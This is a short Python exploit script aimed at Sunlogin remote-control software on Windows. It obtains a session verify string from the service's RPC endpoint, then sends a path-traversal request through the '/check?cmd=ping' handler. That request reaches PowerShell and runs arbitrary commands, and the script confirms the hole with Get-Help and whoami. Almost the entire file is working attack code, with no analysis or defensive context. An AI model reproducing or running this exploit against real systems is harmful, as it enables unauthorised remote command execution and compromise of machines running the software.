import requests


class Exploit(object):

    def get_verify_string(self, url):
        r = requests.post(
            url + "/cgi-bin/rpc",
            data={
                "action": "verify-haras"
            }
        )
        return r.json().get("verify_string")

    def execute_cmd(self, url, command):
        verify_string = self.get_verify_string(url)

        r = requests.get(
            url + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%"
                  "2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{}".format(command),
            headers={
                "Cookie": "CID={}".format(verify_string)
            }
        )
        return r.content.decode("gbk")

    def attack(self, url):

        if 'go.microsoft.com' in self.execute_cmd(url, "Get-Help"):
            return "Sunlogin Rce for Windows, Execute whoami: `{}`".format(self.execute_cmd(url, "whoami"))


if __name__ == '__main__':
    print(Exploit().attack("http://192.168.5.56:61490"))

